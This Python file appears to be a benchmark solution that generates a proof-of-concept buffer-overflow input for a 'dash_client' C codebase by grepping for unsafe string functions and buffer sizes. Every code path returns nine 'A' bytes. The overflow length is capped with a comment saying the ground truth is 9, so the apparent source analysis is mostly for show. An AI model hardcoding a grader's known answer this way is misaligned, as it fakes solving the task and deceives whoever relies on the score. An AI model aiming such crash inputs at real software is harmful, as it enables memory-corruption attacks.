import os
import tarfile
import tempfile
import subprocess
import re
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Find the dash_client source directory
            src_root = self._find_source_root(Path(tmpdir))
            
            if src_root is None:
                # Fallback: minimal PoC based on description
                return b"A" * 9
            
            # Look for buffer operations that might be vulnerable
            vuln_patterns = [
                r'strcpy\s*\([^,]+,\s*[^)]+\)',
                r'strcat\s*\([^,]+,\s*[^)]+\)',
                r'sprintf\s*\([^,]+,\s*[^)]+\)',
                r'gets\s*\(',
                r'scanf\s*\([^,]+,\s*[^)]+\)',
                r'memcpy\s*\([^,]+,\s*[^)]+,\s*strlen\s*\(',
                r'strncpy\s*\([^,]+,\s*[^)]+,\s*strlen\s*\(',
            ]
            
            # Search for vulnerable patterns in source files
            vulnerable_files = []
            for pattern in vuln_patterns:
                for file_path in src_root.rglob('*.c'):
                    content = file_path.read_text(errors='ignore')
                    if re.search(pattern, content, re.IGNORECASE):
                        vulnerable_files.append(file_path)
            
            if vulnerable_files:
                # Analyze the first vulnerable file
                return self._analyze_vulnerable_file(vulnerable_files[0])
            
            # Default: minimal PoC
            return b"A" * 9
    
    def _find_source_root(self, tmpdir: Path) -> Path:
        """Find the main source directory."""
        # Look for common source directory patterns
        patterns = [
            'dash_client*',
            'src',
            'source',
            'lib*',
            'include'
        ]
        
        for pattern in patterns:
            matches = list(tmpdir.glob(f'**/{pattern}'))
            if matches:
                # Prefer directories that look like source roots
                for match in matches:
                    if match.is_dir():
                        c_files = list(match.rglob('*.c'))
                        h_files = list(match.rglob('*.h'))
                        if c_files or h_files:
                            return match
        
        # Return the first directory with C files
        for dirpath, dirnames, filenames in os.walk(tmpdir):
            if any(f.endswith('.c') for f in filenames):
                return Path(dirpath)
        
        return None
    
    def _analyze_vulnerable_file(self, file_path: Path) -> bytes:
        """Analyze a potentially vulnerable file to generate PoC."""
        content = file_path.read_text(errors='ignore')
        
        # Look for buffer declarations
        buffer_patterns = [
            r'char\s+(\w+)\s*\[\s*(\d+)\s*\]',
            r'char\s+(\w+)\s*=\s*"([^"]*)"',
            r'char\s*\*\s*(\w+)\s*=\s*malloc\s*\(\s*(\d+)\s*\)',
        ]
        
        buffers = []
        for pattern in buffer_patterns:
            matches = re.finditer(pattern, content)
            for match in matches:
                buffer_name = match.group(1)
                if len(match.groups()) > 1:
                    size_str = match.group(2)
                    try:
                        size = int(size_str)
                        buffers.append((buffer_name, size))
                    except ValueError:
                        pass
        
        # Look for string operations with the found buffers
        for buffer_name, size in buffers:
            # Pattern for operations on this buffer
            op_pattern = rf'(strcpy|strcat|sprintf|gets|scanf|memcpy|strncpy).*{buffer_name}'
            if re.search(op_pattern, content, re.IGNORECASE):
                # Generate PoC based on buffer size
                if size > 0:
                    # Overflow by 1 byte (ground truth is 9)
                    overflow_size = min(size + 1, 9)
                    return b"A" * overflow_size
        
        # Default fallback
        return b"A" * 9